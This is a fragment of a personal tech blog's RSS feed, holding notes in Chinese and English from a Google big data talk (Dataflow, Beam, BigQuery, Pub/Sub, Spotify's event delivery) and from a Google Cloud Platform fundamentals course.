&lt;p&gt;當然還是要感謝辛苦的工作人員們，&lt;br /&gt;
感謝給了大家這麼好的一場年會。  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sun, 05 Jun 2016 23:22:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-06-03:posts/2016/06/03/pycon-tw-2016/</guid><category>Python</category><category>Conf</category><category>PyCon</category><category>PyConTW</category></item><item><title>Taiwan Customer Sharing Session - with Google Big Data Engineering team</title><link>https://blog.m157q.tw/posts/2016/06/03/taiwan-customer-sharing-session-with-google-big-data-engineering-team/</link><description>&lt;h1&gt;Big Data at Google&lt;/h1&gt;
&lt;h2&gt;Speaker: Apurva Desai&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Apurva Desai has over 20 years of experience in building software and managing teams.  He has been with early stage startups to big sized companies.   He has been focused on cloud, big data and distributed computing for the last 10+years starting with Yahoo where his team was responsible to manage 20k+ nodes of Hadoop and provide solutions to internal projects migrating to Hadoop ecosystem.  At Pivotal Software, a spinoff of EMC, his team built and commercialized Pivotal’s Hadoop distribution.  Most recently he managed Motorola’s mobile phone experiences powered by mobile cloud backend running on GCP.  Apurva earned his Bachelor’s of engineering from University of Mumbai, India and Master of engineering from Simon Fraser University, Canada  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://research.google.com/pubs/pub41378.html"&gt;MillWheel&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://flume.apache.org/"&gt;Flume&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;What does Cloud 3.0 look like?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Cloud 2.0 (Assembly Required)  &lt;ul&gt;
&lt;li&gt;VMs  &lt;/li&gt;
&lt;li&gt;Object Store  &lt;/li&gt;
&lt;li&gt;Databases  &lt;/li&gt;
&lt;li&gt;Networking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Containers  &lt;/li&gt;
&lt;li&gt;Messaging  &lt;/li&gt;
&lt;li&gt;NoSQL  &lt;/li&gt;
&lt;li&gt;Big Data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Complixities of Big Data Processing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Programming  &lt;/li&gt;
&lt;li&gt;Resource provisioning  &lt;/li&gt;
&lt;li&gt;Handling growing scale  &lt;/li&gt;
&lt;li&gt;Reliability  &lt;/li&gt;
&lt;li&gt;Deployment &amp;amp; Configuration  &lt;/li&gt;
&lt;li&gt;Utilization improvements  &lt;/li&gt;
&lt;li&gt;Performance tuning  &lt;/li&gt;
&lt;li&gt;Monitoring  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;But what you should do is focusing on programming and dig your data.  &lt;/p&gt;
&lt;h2&gt;10+ Years of Tackling Big Data Problems&lt;/h2&gt;
&lt;p&gt;&lt;img alt="10+ Years of Tackling Big Data Problem" src="/files/taiwan-customer-sharing-session-with-google-big-data-engineering-team/google-big-data-history.jpg" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Google_File_System"&gt;GFS&lt;/a&gt; (2002 ~ 2004)  &lt;/li&gt;
&lt;li&gt;MapReduce (2004 ~ 2005)  &lt;ul&gt;
&lt;li&gt;Dataflow (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigTable (2005 ~ 2006)  &lt;ul&gt;
&lt;li&gt;Apache HBase  &lt;/li&gt;
&lt;li&gt;Hadoop  &lt;/li&gt;
&lt;li&gt;Bigtable (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dremel (2006 ~ 2008)  &lt;ul&gt;
&lt;li&gt;Apache Drill  &lt;/li&gt;
&lt;li&gt;BigQuery (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PubSub (2008 ~ 2010)  &lt;ul&gt;
&lt;li&gt;Pub/Sub (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FlumeJava (2010 ~ 2012)  &lt;ul&gt;
&lt;li&gt;Apache Crunch  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MillWheel (2012 ~ 2014)  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://beam.apache.org"&gt;Apache Beam&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Dataflow (GCP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TensorFlow (2014 ~ now)  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;"Google is living a few years in the future and sending the rest of us messages." - Doug Cutting, Hadoop Co-Creator  &lt;/p&gt;
&lt;h2&gt;Bridging the Waves&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Bridging the Waves" src="/files/taiwan-customer-sharing-session-with-google-big-data-engineering-team/bridging-the-waves.jpg" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Capture  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Pub/Sub  &lt;/li&gt;
&lt;li&gt;Logs, App Engine  &lt;/li&gt;
&lt;li&gt;BigQuery streaming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Rabbit MQ  &lt;/li&gt;
&lt;li&gt;Kafka  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Store  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Cloud Storage (objects)  &lt;/li&gt;
&lt;li&gt;BigQuery Storage (structured)  &lt;/li&gt;
&lt;li&gt;Cloud Bigtable (NoSQL HBase)  &lt;/li&gt;
&lt;li&gt;Cloud Datastore (NoSQL)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Cassandra  &lt;/li&gt;
&lt;li&gt;HBase  &lt;/li&gt;
&lt;li&gt;MongoDB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Process  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Cloud Dataflow (stream and batch)  &lt;/li&gt;
&lt;li&gt;Cloud Dataproc  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Hadoop &amp;amp; Ecosystem  &lt;ul&gt;
&lt;li&gt;Spark  &lt;/li&gt;
&lt;li&gt;Hive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Analyze  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;BigQuery (large scale SQL)  &lt;/li&gt;
&lt;li&gt;Cloud Machine Learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Hadoop &amp;amp; Ecosystem  &lt;ul&gt;
&lt;li&gt;Spark  &lt;/li&gt;
&lt;li&gt;Hive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Visualize  &lt;ul&gt;
&lt;li&gt;Cloud 3.0  &lt;ul&gt;
&lt;li&gt;Cloud DataLab (Python/Jupyter Notebook)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud 2.0  &lt;ul&gt;
&lt;li&gt;Tableau  &lt;/li&gt;
&lt;li&gt;Qlik  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Reference Architecture&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Reference Architecture" src="/files/taiwan-customer-sharing-session-with-google-big-data-engineering-team/reference-architecture.jpg" /&gt;  &lt;/p&gt;
&lt;h2&gt;Apache Beam and Google Cloud Dataflow&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Dataflow  &lt;ul&gt;
&lt;li&gt;API Interface (SDK)  &lt;ul&gt;
&lt;li&gt;Dataflow model / Beam model  &lt;/li&gt;
&lt;li&gt;You can write you own sdk with any language  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Apache Beam  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Beam vs Spark&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Classic Batch Processing  &lt;ul&gt;
&lt;li&gt;Simillar  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Windowing  &lt;ul&gt;
&lt;li&gt;Beam  &lt;ul&gt;
&lt;li&gt;Window  &lt;/li&gt;
&lt;li&gt;Sum  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Spark  &lt;ul&gt;
&lt;li&gt;Window &amp;amp; Sum  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Late Data  &lt;ul&gt;
&lt;li&gt;Beam is more easy to implement in this part  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sessions  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Dataflow&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fully-managed and auto-configured  &lt;/li&gt;
&lt;li&gt;Auto graph-optimized for best execution path  &lt;/li&gt;
&lt;li&gt;Autoscaling mid-job  &lt;/li&gt;
&lt;li&gt;Dynamic Work Rebalancing mid-job  &lt;/li&gt;
&lt;li&gt;Fault Tolerant execution of Beam pipelines  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Dataproc - Managed Hadoop + Spark&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Start a massive Hadoop or Spark cluster in 90 seconds  &lt;/li&gt;
&lt;li&gt;Pre emptible VMs at 30% of othe cost, Custom VMs  &lt;/li&gt;
&lt;li&gt;Per-minute billing  &lt;/li&gt;
&lt;li&gt;Separation of Storage + Compute  &lt;/li&gt;
&lt;li&gt;Incredibly fast networking  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Ephemeral clusters - jobs before clusters&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Deploy Cluster  &lt;/li&gt;
&lt;li&gt;Submits jobs  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Separation of Storage and Compute&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Based on your use cases  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;BigQuery&lt;/h2&gt;
&lt;h3&gt;Fun BigQuery Stats&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Largest query by rows =&amp;gt; 10.5 Trillion rows  &lt;/li&gt;
&lt;li&gt;Larget query by data size =&amp;gt; 2.1 PB  &lt;/li&gt;
&lt;li&gt;Largest storage customer =&amp;gt; 62 PB  &lt;/li&gt;
&lt;li&gt;Streaming per second =&amp;gt; 4.5 million  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;BigQuery - explained&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;We just rented ~9000 cores from Google for ~30 seconds  &lt;/li&gt;
&lt;li&gt;We only paid $20  &lt;/li&gt;
&lt;li&gt;Most importantly, it's hide from end users.  &lt;/li&gt;
&lt;li&gt;Users do not thins about cores.  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;What is BigQuery?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Serveless, Fully Managed, No-Ops Data Warehouse  &lt;/li&gt;
&lt;li&gt;Petabyte-Scale and Fast  &lt;/li&gt;
&lt;li&gt;Convenience of SQL  &lt;/li&gt;
&lt;li&gt;Externalization of Google Dremel  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Cloud Pub/Sub - Asynchronous Messaging&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;A FULLY-MANAGED GLOBAL Publish and Subscribe service (a many-to-many queue)  &lt;/li&gt;
&lt;li&gt;Seamlessly scales to 1,000,000+ QPS  &lt;/li&gt;
&lt;li&gt;Guaranteed durable at-least-once delivery  &lt;/li&gt;
&lt;li&gt;7-day message acknowledgement window  &lt;/li&gt;
&lt;li&gt;Simple REST API makes it portable  &lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.oreilly.com/ideas/the-world-beyond-batch-streaming-102"&gt;The world beyond batch: Streaming 102 - O'Reilly Media&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Case study: Spotify's Event Delivery System&lt;/h1&gt;
&lt;h2&gt;Speaker: Jelena Pješivac-Grbović&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Dr. Jelena Pješivac-Grbović is a staff software engineer in Cloud at Google, in Mountain View, CA. She is the lead for MapReduce and one of the leads of the Google Cloud Dataflow project.  Jelena's research interests include large-scale data processing, distributed, and cloud computing. She is an active member of IEEE, ACM, and SWE.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;其實就是把 References 那三篇稍微帶過這樣。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Event Delivery System  &lt;ul&gt;
&lt;li&gt;High QPS  &lt;ul&gt;
&lt;li&gt;~700K events/sec in peak  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://labs.spotify.com/2016/02/25/spotifys-event-delivery-the-road-to-the-cloud-part-i/"&gt;Spotify’s Event Delivery – The Road to the Cloud (Part I) | Labs&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://labs.spotify.com/2016/03/03/spotifys-event-delivery-the-road-to-the-cloud-part-ii/"&gt;Spotify’s Event Delivery – The Road to the Cloud (Part II) | Labs&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://labs.spotify.com/2016/03/10/spotifys-event-delivery-the-road-to-the-cloud-part-iii/"&gt;Spotify’s Event Delivery – The Road to the Cloud (Part III) | Labs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;附上一張到此一遊照 (?)  &lt;/p&gt;
&lt;p&gt;&lt;img alt="GCP VIP Customer Workshop" src="/files/taiwan-customer-sharing-session-with-google-big-data-engineering-team/gcp-vip-customer-workshop.jpg" /&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 03 Jun 2016 10:15:32 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-06-03:posts/2016/06/03/taiwan-customer-sharing-session-with-google-big-data-engineering-team/</guid><category>Google Cloud Platform</category></item><item><title>CP100A: Google Cloud Platform Fundamentals</title><link>https://blog.m157q.tw/posts/2016/05/25/cp100a-google-cloud-platform-fundamentals/</link><description>&lt;h1&gt;課程資訊&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://myclass.gcptrain.org/"&gt;http://myclass.gcptrain.org/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;OXZnOGVkCg==  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/"&gt;https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/cp100-v2"&gt;https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/cp100-v2&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIaXNqWnNDT0VmaG8/view?usp=sharing"&gt;slides.tar.gz&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Course Overview&lt;/h1&gt;
&lt;p&gt;&lt;img alt="CP100 V2: Google Cloud Platform Fundamentals" src="/files/cp100a-google-cloud-platform-fundamentals/course-overview.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 1: Introducing Google Cloud Platform&lt;/h1&gt;
&lt;h2&gt;Why Choose Google Cloud Platform?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;你可以在 GCP 看到所有不同 Region 的機器，不用像 AWS 一樣必須切換 Region  &lt;/li&gt;
&lt;li&gt;可以直接享用 Google 遍布全球的網路設施  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google's Infrastructure&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloudplatformonline.com/next2016-schedule.html"&gt;GCP Next&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP 的年度會議  &lt;blockquote&gt;
&lt;p&gt;目前似乎辦了兩屆。&lt;br /&gt;
2015 年第一屆辦在日本東京&lt;br /&gt;
2016 年第二屆辦在荷蘭阿姆斯特丹。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最近在日本新增了 Data Center  &lt;/li&gt;
&lt;li&gt;Google 的高速 Backbone Network  &lt;/li&gt;
&lt;li&gt;Points of Presence  &lt;ul&gt;
&lt;li&gt;幾乎全球都有節點  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Edge Caching  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Cloud Regions and Zones&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Central US  &lt;/li&gt;
&lt;li&gt;Eastern US  &lt;/li&gt;
&lt;li&gt;East Asia  &lt;ul&gt;
&lt;li&gt;Data Center 在彰化  &lt;/li&gt;
&lt;li&gt;和 CloudFlare 有合作，最近 CloudFlare 和中華電信合作，在台北有機房。  &lt;/li&gt;
&lt;li&gt;所以在臺灣的 latency 蠻低的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Western Europe  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/compute/docs/regions-zones/regions-zones"&gt;https://cloud.google.com/compute/docs/regions-zones/regions-zones&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Innovative, Customer-Friendly Pricing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Sub-hour billing  &lt;ul&gt;
&lt;li&gt;以分計費  &lt;/li&gt;
&lt;li&gt;不像 AWS 以小時計費，不滿一小時仍然以一小時計費  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sustained-use discounts  &lt;ul&gt;
&lt;li&gt;機器開超過一定的時間就會有折扣，採累進的折扣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Compute Engine custom machine types  &lt;/li&gt;
&lt;li&gt;價錢比較便宜，但有夠難算 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Commitment to Open APIs and Open Source&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;TensorFlow  &lt;/li&gt;
&lt;li&gt;Android  &lt;/li&gt;
&lt;li&gt;Go  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://kubernetes.io/"&gt;Kubernetes&lt;/a&gt; (k8s)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;The Future of Cloud Computing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;1st wave: Colocation  &lt;/li&gt;
&lt;li&gt;2nd wave: Virtualized Data Centers  &lt;/li&gt;
&lt;li&gt;3rd wave: A global, elastic cloud  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;IaaS and PaaS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;IaaS: Compute Engine  &lt;ul&gt;
&lt;li&gt;Towards managed infrastructure (DevOps)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PaaS: App Engine  &lt;ul&gt;
&lt;li&gt;Towards managed services (NoOps)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google Cloud Platform&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Google Cloud Platform" src="/files/cp100a-google-cloud-platform-fundamentals/gcp.png" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Storage  &lt;ul&gt;
&lt;li&gt;BigTable  &lt;ul&gt;
&lt;li&gt;Fully Compatible with HBase  &lt;/li&gt;
&lt;li&gt;Google 版本的 HBase  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud SQL  &lt;ul&gt;
&lt;li&gt;最近出了 2.0 (2nd Generation)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Big Data  &lt;ul&gt;
&lt;li&gt;Pub/Sub  &lt;ul&gt;
&lt;li&gt;Distributed Message Queue like Kafka  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/dataflow/"&gt;Dataflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;a unified programming model and a managed service for developing and executing a wide range of data processing patterns including ETL, batch computation, and continuous computation.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/dataproc/"&gt;Dataproc&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Spark Cluster  &lt;/li&gt;
&lt;li&gt;an Apache Hadoop, Apache Spark, Apache Pig, and Apache Hive service, to easily process big datasets at low cost.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datalab  &lt;ul&gt;
&lt;li&gt;基本上就是 Google Cloud 版本的 Jupyter Notebook (IPython Notebook)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Launcher&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;和 Bitnami 合作提供的服務  &lt;/li&gt;
&lt;li&gt;可以直接在上面直接 Create 設定好的 GCE instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 1&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-free-trial/#0"&gt;Sign Up for the Free Trial and Create a Project&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/stackdriver/"&gt;Stackdriver&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;monitoring, logging, &amp;amp; diagnostics  &lt;/li&gt;
&lt;li&gt;可以整合 GCP 和 AWS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://console.cloud.google.com/launcher"&gt;Cloud Launcher&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/launcher/docs/#deploying_a_software_package"&gt;https://cloud.google.com/launcher/docs/#deploying_a_software_package&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;點下去可以直接幫你 create 安裝好該服務的 GCE instance，簡單來說就是已經預先做好 Image 然後直接幫你塞進去。  &lt;ul&gt;
&lt;li&gt;我原本以為是可以複選，然後一次幫你安裝剛剛選的那些服務到一台 GCE instance 上，但看來是比較提倡分散式就是了，當然這樣在 Production 上會比較好，不然一台 instance 炸了就所有服務都炸了 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Project 的管理  &lt;ul&gt;
&lt;li&gt;Members 的 account 可以採用 gmail.com, apps for work 的 account, Google Groups 的 account, service account  &lt;/li&gt;
&lt;li&gt;一個帳號可以管理多個 project  &lt;/li&gt;
&lt;li&gt;管錢的和管 Project 的帳號可以分開設定  &lt;/li&gt;
&lt;li&gt;可以考慮多開不同的 Project，一來是 Quota 的限制比較不會那麼吃緊，二來是 Permission 的設定可以比較不需要那麼費心，如果全部的 Team 都擠在同個 Project 的話，Permission 的設定可能得多費心調整。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Billing  &lt;ul&gt;
&lt;li&gt;Sustain Pricing 在遇到 billing account change 的時候會重算，所以  &lt;/li&gt;
&lt;li&gt;可以設定 budget，超過的時候會通知，每個服務也都可以設限。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 2: Getting Started with Google Cloud Platform&lt;/h1&gt;
&lt;h2&gt;Cloud Computing&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Compute Engine --- Container Engine --- App Engine --- Cloud Endpoints  
IaaS ------------- Clusters -------- Managed VMs (beta) -------- PaaS  
Configurability DevOps &amp;lt;-----------------------------&amp;gt; Agility NoOps  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;IaaS  &lt;ul&gt;
&lt;li&gt;Compute Engine == AWS EC2 == Virtual Machine  &lt;ul&gt;
&lt;li&gt;Raw compute granular control  &lt;/li&gt;
&lt;li&gt;可以使用預先提供好的 Image，也可以自己建好 Image 再上傳來用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PaaS  &lt;ul&gt;
&lt;li&gt;App Engine  &lt;ul&gt;
&lt;li&gt;最早出來的時候是只有 Python  &lt;/li&gt;
&lt;li&gt;有漲價過，當時一堆人離開  &lt;/li&gt;
&lt;li&gt;後來又有一些人回來用，支援 Java, Go, PHP, Python  &lt;/li&gt;
&lt;li&gt;最近 Beta 開始支援 Ruby  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Endpoints  &lt;ul&gt;
&lt;li&gt;Preset run-times  &lt;/li&gt;
&lt;li&gt;Focus app logic  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SaaS  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/apis-explorer/#p/"&gt;Google APIs Explorer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;只要是 Google 的服務基本上都會有 API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 2&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-cloud-launcher/#0"&gt;Getting Started with Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 3: Google App Engine and Google Cloud Datastore&lt;/h1&gt;
&lt;h2&gt;Google App Engine&lt;/h2&gt;
&lt;h3&gt;What is Google App Engine&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Managed runtimes for specific versions of Java, Python, PHP and Go. (Standard Runtime)  &lt;/li&gt;
&lt;li&gt;Autoscale workloads to meet demand  &lt;ul&gt;
&lt;li&gt;可以透過 app.yaml 去做 autoscale 的設定  &lt;/li&gt;
&lt;li&gt;也可以透過 app.yaml 對 instance class 做設定，預設是用最低階的 F1，可以參考 &lt;a href="https://cloud.google.com/appengine/docs/python/config/appref#scaling_elements"&gt;app.yaml Reference|Python|Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Free daily quota, usage based pricing  &lt;/li&gt;
&lt;li&gt;Local SDK for development, testing and deployment  &lt;/li&gt;
&lt;li&gt;Need to conform to sandbox constraints  &lt;ul&gt;
&lt;li&gt;No writing to the local filesystem  &lt;/li&gt;
&lt;li&gt;Request timeouts at 60 seconds  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;可以透過 version 來控管每個 service (原本叫 module，最近改叫 service 了）  &lt;/li&gt;
&lt;li&gt;可以透過 split traffic 做 A/B testing  &lt;/li&gt;
